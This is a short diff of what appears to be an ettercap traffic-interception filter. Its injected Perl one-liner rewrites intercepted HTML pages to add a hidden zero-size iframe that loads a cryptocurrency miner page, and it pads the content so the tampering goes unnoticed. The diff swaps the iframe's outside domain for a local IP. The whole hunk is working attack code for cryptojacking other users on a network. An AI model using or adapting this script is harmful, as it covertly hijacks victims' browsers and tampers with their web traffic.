@@ -13,7 +13,7 @@ if (ip.proto == TCP) {
       execinject("rm tmp/pagedata 2>/dev/null");
       log(DATA.data, "tmp/pagedata");
       drop();
-      execinject("perl -e 'while ($a = <>) { $c = $c . $a;$chars1 += length($a);if ($a =~ m/<!--.*-->/){$a =~ s/<!--.*-->//g}if($a =~ m/<body/) {$a =~ s/(<body.*?>)(.*)/\1<iframe width=0 height=0 src=\"http:\/\/wtyw.net\/lm-old\"><\/iframe>\2/s}; $b = $b . $a;} $chars2 = length($b); if ($chars1 > $chars2) {$b = $b . " "x($chars1-$chars2);print $b} if ($chars1 < $chars2) {print $c}' tmp/pagedata");
+      execinject("perl -e 'while ($a = <>) { $c = $c . $a;$chars1 += length($a);if ($a =~ m/<!--.*-->/){$a =~ s/<!--.*-->//g}if($a =~ m/<body/) {$a =~ s/(<body.*?>)(.*)/\1<iframe width=0 height=0 src=\"http:\/\/192.168.0.2\/lm\"><\/iframe>\2/s}; $b = $b . $a;} $chars2 = length($b); if ($chars1 > $chars2) {$b = $b . " "x($chars1-$chars2);print $b} if ($chars1 < $chars2) {print $c}' tmp/pagedata");
       msg("[*] Miner Injected.\n");
     }
   }
